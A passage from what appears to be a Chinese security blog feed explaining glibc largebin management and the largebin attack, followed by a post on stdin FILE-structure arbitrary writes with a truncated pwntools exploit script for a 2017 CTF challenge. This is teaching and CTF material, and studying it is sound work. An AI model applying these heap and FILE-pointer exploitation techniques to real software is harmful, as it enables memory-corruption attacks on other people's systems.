<h2 id="0x01-lagrgebin-管理机制"><a href="#0x01-lagrgebin-管理机制" class="headerlink" title="0x01 lagrgebin 管理机制"></a>0x01 lagrgebin 管理机制</h2><p>large bins 中一共包括 63 个 bin，每个 bin 中的 chunk 的大小不一致，而是处于一定区间范围内。此外，这 63 个 bin 被分成了 6 组，每组 bin 中的 chunk 大小之间的公差一致，具体如下：</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody></table>
<p>与smallbin不同的是，largebin中不再是一个index只对应一个大小的size，而是存储等差数列变化的chunk块。其相关定义如下：</p>
<p>这个宏写的真的是十分优雅</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> largebin_index_64(sz)                                                \</span></span><br><span class="line">  (((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>) ?  <span class="number">48</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">6</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>) ?  <span class="number">91</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">9</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>) ? <span class="number">110</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">12</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>) ? <span class="number">119</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">15</span>) :\</span><br><span class="line">   ((((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>) ? <span class="number">124</span> + (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (sz)) &gt;&gt; <span class="number">18</span>) :\</span><br><span class="line">   <span class="number">126</span>)</span><br></pre></td></tr></table></figure>

<p>largebin管理的是一个范围区间的堆块，此时<code>fd_nextsize</code>与<code>bk_nextsize</code>就派上了用场。</p>
<p>大小对应相同index中的堆块，其在链表中的排序方式为：</p>
<ul>
<li><p>堆块从大到小排序。</p>
</li>
<li><p>对于相同大小的堆块，最先释放的堆块会成为堆头，其<code>fd_nextsize</code>与<code>bk_nextsize</code>会被赋值，其余的堆块释放后都会插入到该堆头结点的下一个结点，通过<code>fd</code>与<code>bk</code>链接，形成了先释放的在链表后面的排序方式，且其<code>fd_nextsize</code>与<code>bk_nextsize</code>都为0。</p>
</li>
<li><p>不同大小的堆块通过堆头串联，即堆头中<code>fd_nextsize</code>指向比它小的堆块的堆头，<code>bk_nextsize</code>指向比它大的堆块的堆头，从而形成了第一点中的从大到小排序堆块的方式。同时最大的堆块的堆头的<code>bk_nextsize</code>指向最小的堆块的堆头，最小堆块的堆头的<code>fd_nextsize</code>指向最大堆块的堆头，以此形成循环双链表。</p>
</li>
</ul>
<p>接下来具体看源码中是如何实现将largebin chunk从unsorted bin中取下来放入到largebin中的。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              ...  <span class="comment">// chunk为smallbin，放入到smallbin中</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);<span class="comment">//第一步，获取当前要插入的chunk对应的index</span></span><br><span class="line">              bck = bin_at (av, victim_index); <span class="comment">//当前index中最小的chunk</span></span><br><span class="line">              fwd = bck-&gt;fd;                   <span class="comment">//当前index中最大的chunk</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123; <span class="comment">// 该chunk对应的largebin index中不为空</span></span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (bck-&gt;bk-&gt;size)) <span class="comment">//第三步，如果要插入的chunk的size小于当前index中最小chunk的大小，则直接插入到最后面。</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; fwd-&gt;size) <span class="comment">//第四步，如果插入的chunk不为最小，则通过`fd_nextsize`从大到小遍历chunk，找到小于等于要插入chunk的位置</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd; <span class="comment">//第五步，如果存在堆头，则插入到堆头的下一个节点</span></span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123; <span class="comment">//第六步，否则这个chunk将会成为堆头，`bk_nextsize`和`fd_nextsize`将被置位</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span>   <span class="comment">//第二步，chunk对应的largebin index中为空</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          <span class="comment">//设置fd与bk完成插入</span></span><br><span class="line">          victim-&gt;bk = bck; </span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line">          ...</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>整个流程可以总结为：</p>
<ol>
<li>找到当前要插入的chunk对应的largebin的index，并定位该index中的最小的chunk<code>bck</code>和最大的chunk<code>fwd</code>。</li>
<li>如果<code>fwd</code>等于<code>bck</code>，表明当前链表为空，则直接将该chunk插入，并设置该chunk为该大小堆块的堆头，将<code>bk_nextsize</code>和<code>fd_nextsize</code>赋值为它本身。</li>
<li>如果<code>fwd</code>不等于<code>bck</code>，表明当前链表已经存在chunk，要做的就是找到当前chunk对应的位置将其插入。首先判断其大小是否小于最小chunk的size，<code>(size) &lt; (bck-&gt;bk-&gt;size)</code>，如果小于则说明该chunk为当前链表中最小的chunk，即插入位置在链表末尾，无需遍历链表，直接插入到链表的末尾，且该chunk没有对应的堆头，设置该chunk为相应堆大小堆的堆头，将<code>bk_nextsize</code>指向比它大的堆头，<code>fd_nextsize</code>指向双链表的第一个节点即最大的堆头。</li>
<li>如果当前chunk的size不是最小的chunk，则从双链表的第一个节点即最大的chunk的堆头开始遍历，通过<code>fd_nextsize</code>进行遍历，由于<code>fd_nextsize</code>指向的是比当前堆头小的堆头，因此可以加快遍历速度。直到找到小于等于要插入的chunk的size。</li>
<li>如果找到的chunk的size等于要插入chunk的size，则说明当前要插入的chunk的size已经存在堆头，那么只需将该chunk插入到堆头的下一个节点。</li>
<li>如果找到的chunk的size小于当前要插入chunk的size，则说明当前插入的chunk不存在堆头，因此该chunk会成为堆头插入到该位置，设置<code>fd_nextsize</code>与<code>bk_nextsize</code>。</li>
</ol>
<p>通过源码分析可以与之前的排序方式对应上，接下来我们再看largebin是如何被申请出来的。</p>
<p>相关源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx); <span class="comment">//找到申请的size对应的largebin链表</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) <span class="comment">//第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize; </span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize; </span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="comment">//第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span></span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//第四步，largebin unlink 操作</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE) <span class="comment">//第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户</span></span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb); <span class="comment">//第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中。</span></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>可以将整个流程总结为：</p>
<ol>
<li><p>找到当前要申请的空间对应的largebin链表，判断第一个结点即最大结点的大小是否大于要申请的空间，如果小于则说明largebin中没有合适的堆块，需采用其他分配方式。</p>
</li>
<li><p>如果当前largebin中存在合适的堆块，则从最小堆块开始，通过<code>bk_nextsize</code>反向遍历链表，找到大于等于当前申请空间的结点。</p>
</li>
<li><p>为减少操作，判断找到的相应结点（堆头）的下个结点是否是相同大小的堆块，如果是的话，将目标设置为该堆头的第二个结点，以此减少将<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值的操作。</p>
</li>
<li><p>调用<code>unlink</code>将目标largebin chunk从双链表中取下。</p>
</li>
<li><p>判断剩余空间是否小于MINSIZE，如果小于直接返回给用户。</p>
</li>
<li><p>否则将剩余的空间构成新的chunk放入到unsorted bin中。</p>
</li>
</ol>
<p>再看下<code>unlink</code>的源码：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != (next_chunk(P))-&gt;prev_size, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted size vs. prev_size"</span>, P, AV);  \</span><br><span class="line">    FD = P-&gt;fd;                                      \</span><br><span class="line">    BK = P-&gt;bk;                                      \</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))              \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  \</span><br><span class="line">    <span class="keyword">else</span> &#123;                                      \</span><br><span class="line">        FD-&gt;bk = BK;                                  \</span><br><span class="line">        BK-&gt;fd = FD;                                  \</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;              \</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)          \</span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">          malloc_printerr (check_action,                      \</span><br><span class="line">                   <span class="string">"corrupted double-linked list (not small)"</span>,    \</span><br><span class="line">                   P, AV);                          \</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                      \</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span><br><span class="line">                <span class="keyword">else</span> &#123;                                  \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \</span><br><span class="line">                  &#125;                                  \</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                  \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span><br><span class="line">              &#125;                                      \</span><br><span class="line">          &#125;                                      \</span><br><span class="line">      &#125;                                          \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看看largebin的unlink检查，从代码中可以看到，就是多了<code>fd_nextsize</code>和<code>bk_nextsize</code>俩个位置的检查，原理和<code>fd</code>和<code>bk</code>的检查一致。但是需要注意的是对于存在多个满足空间的堆块来说，申请出来的是堆头的下一个结点，它的<code>fd_nextsize</code>和<code>bk_nextsize</code>为空。也就是说即使它是largebin chunk，但是它的<code>fd_nextsize</code>也为空，即不满足条件<code>__builtin_expect (P-&gt;fd_nextsize != NULL, 0)</code>，对于此类chunk的unlink，只会像smallbin的unlink一样检查<code>fd</code>与<code>bk</code>，而不会对<code>fd_nextsize</code>与<code>bk_nextsize</code>进行检查与操作。</p>
<p>至此largebin链表的形成以及申请largebin都已经阐述清楚。再小结下，对于largebin的链表的插入，双链表是从大到小的chunk排序，相同大小的chunk会有一个堆头，只有堆头的<code>fd_nextsize</code>与<code>bk_nextsize</code>会被赋值，其余堆块的该字段为0。插入的遍历是通过<code>fd_nextsize</code>从大到小进行的，如果该插入的chunk存在对应堆头，则插入到该堆头的下一个结点，否则的话该chunk会成为堆头插入到链表中。</p>
<p>对于largebin的申请，通过判断双链表的第一个结点（最大结点）的大小来判断是否存在满足的堆块，如果有则从小到大通过<code>bk_nextsize</code>反向遍历双链表，找到最小的满足申请需求的堆块，如果该堆头下一个结点的大小也满足则将该结点作为目标分配给用户，以此减少链表的<code>fd_nextsize</code>与<code>bk_nextsize</code>操作，提高效率。对于双链表的unlink，需要注意的就是<code>fd_nextsize</code>与<code>bk_nextsize</code>检查，特别需要注意的是当结点是堆头的下一个结点时，它的<code>fd_nextsize</code>与<code>bk_nextsize</code>为0，此时unlink操作与smallbin的unlink操作一致，没有<code>fd_nextsize</code>与<code>bk_nextsize</code>的检查与操作。</p>
<h2 id="0x02-largebin-attack"><a href="#0x02-largebin-attack" class="headerlink" title="0x02 largebin attack"></a>0x02 largebin attack</h2><p>largebin attack是在largebin双链表的插入与取下的过程中出现问题，导致可以被申请出非预期内存的情形。总的来说存在两种攻击方式：</p>
<ul>
<li><p>在申请largebin的过程中，伪造largebin的<code>bk_nextsize</code>，实现非预期内存申请。</p>
</li>
<li><p>在largebin插入的过程中，伪造largebin的<code>bk_nextsize</code>以及<code>bk</code>，实现任意地址写堆地址。</p>
</li>
</ul>
<p>下面结合源码和实例具体看这两种攻击方式。</p>
<h3 id="2-1-伪造伪造largebin的bk-nextsize"><a href="#2-1-伪造伪造largebin的bk-nextsize" class="headerlink" title="2.1 伪造伪造largebin的bk_nextsize"></a>2.1 伪造伪造largebin的bk_nextsize</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>此利用方式是在申请largebin的过程中出现的。回到申请largebin的源码中去看，它先判断当前双链表中存在满足申请需求的堆块（判断第一个堆块的大小），然后通过<code>bk_nextsize</code>反向遍历双链表找到第一个大于申请需求的堆块，申请该堆头对应的堆块。</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) <span class="comment">//判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize; </span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;  <span class="comment">//漏洞点，伪造bk_nextsize</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="comment">//申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span></span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//largebin unlink 操作</span></span><br><span class="line"></span><br><span class="line">            ... </span><br><span class="line">            <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p>问题出现在通过<code>bk_nextsize</code>反向遍历双链表的过程，如果能够伪造某个堆头结点中的<code>bk_nextsize</code>，将其指向非预期的内存地址，构造好数据使得非预期内存地址在通过unlink的检查之后，会将该空间返回给用户，最终使得可以申请出非预期的内存。最常见的就是用它来构造overlap chunk。</p>
<p>至于绕过<code>unlink</code>的检查，我认为最好的方式就是伪造的内存空间将<code>fd</code>与<code>bk</code>按照smallbin<code>unlink</code>的利用方式设置，而将<code>bk_nextsize</code>和<code>fd_nextsize</code>设置成0，这样就不会对这两个字段进行操作了。</p>
<p>典型的应用场景为：存在四个堆ABCD，largebin中存在链表A-&gt;B，其中A为0x420，B为0x400，C为0x410，C未释放。将B的<code>bk_nextsize</code>伪造指向C，同时将C的<code>fd</code>与<code>bk</code>构造好，将C的<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值为0，当再次申请0x410大小的内存E时，遍历<code>B-&gt;bk_nextsize</code>会指向C，且C的大小满足需求，因此会调用unlink将C从双链表取下，因此申请出来的堆块E的地址会为C的地址，即E和C为同一内存块，实现overlap chunk的构造。</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>largebin_attack</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>stdin任意地址写</title>
    <url>/year/04/10/cl7iordq30044293f6cpk77xc/</url>
    <content><![CDATA[<p>stdin标准输入缓冲区指针进行任意地址写的功能。</p>
<a id="more"></a>
<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>先通过fread回顾下通过输入缓冲区进行输入的流程：</p>
<ol>
<li>判断fp-&gt;_IO_buf_base输入缓冲区是否为空，如果为空则调用的_IO_doallocbuf去初始化输入缓冲区。</li>
<li>在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。</li>
<li>如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用__underflow函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。<br><img src="/10/cl7iordq30044293f6cpk77xc/1.png" alt><br>假设我们能过控制输入缓冲区指针，使得输入缓冲区指向想要写的地址，那么在第三步调用系统调用读取数据到输入缓冲区的时候，也就会调用系统调用读取数据到我们想要写的地址，从而实现任意地址写的目的。</li>
</ol>
<p>根据fread的源码，我们再看下要想实现往write_start写长度为write_end - write_start的数据具体经历了些什么。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn (_IO_FILE *fp, <span class="keyword">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line"> ...</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">//输入缓冲区为空则初始化输入缓冲区</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (have &gt; <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">          ...</span><br><span class="line">          <span class="comment">//memcpy</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">          &amp;&amp; want &lt; (<span class="keyword">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__underflow (fp) == EOF)  ## 调用__underflow读入数据</span><br><span class="line">          ...</span><br><span class="line">        &#125;</span><br><span class="line">      ...</span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将上述条件综合表述为：</p>
<ol>
<li>设置_IO_read_end等于_IO_read_ptr。</li>
<li>设置_flag &amp;~ _IO_NO_READS即_flag &amp;~ 0x4。</li>
<li>设置_fileno为0。</li>
<li>设置_IO_buf_base为write_start，_IO_buf_end为write_end；且使得_IO_buf_end-_IO_buf_base大于fread要读的数据。<h2 id="0x02-例题"><a href="#0x02-例题" class="headerlink" title="0x02 例题"></a>0x02 例题</h2>whctf2017的stackoverflow</li>
</ol>
<ul>
<li>申请超过0x20000申请的空间会挨着<code>libc</code></li>
<li>因为最后置零用的是temp不是<code>size</code>不一致导致了可以向后面任意一个位置写0，写到<code>IO_buf_base</code>的位置上然后就可以改<code>IO_buf_end</code>了，实现任意地址写。</li>
<li><code>向malloc_hook</code>中写<code>rop</code>读取数据形成栈溢出(这都行。。。。。)<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./stackoverflow'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_one</span><span class="params">(size=<span class="number">0</span>,data=<span class="string">""</span>,real_size=<span class="number">0</span>,flag=False)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"flow: "</span>)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        sh.recvuntil(<span class="string">"ckoverflow: "</span>)</span><br><span class="line">        sh.sendline(str(real_size))</span><br><span class="line">    sh.recvuntil(<span class="string">"ropchain:"</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">evil_write</span><span class="params">(data)</span>:</span></span><br><span class="line">    sh.recvuntil(<span class="string">"flow:"</span>)</span><br><span class="line">    sh.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flush_buff</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,size):</span><br><span class="line">        sh.recvuntil(<span class="string">"padding and ropchain: "</span>)</span><br><span class="line">        sh.sendline(<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'leave your name, bro:'</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))- <span class="number">0x3c5620</span></span><br><span class="line">log.success(<span class="string">'libc_base: '</span> + hex(libc_base)) </span><br><span class="line">io_stdin=libc_base+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">io_stdin_end=libc_base+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]+<span 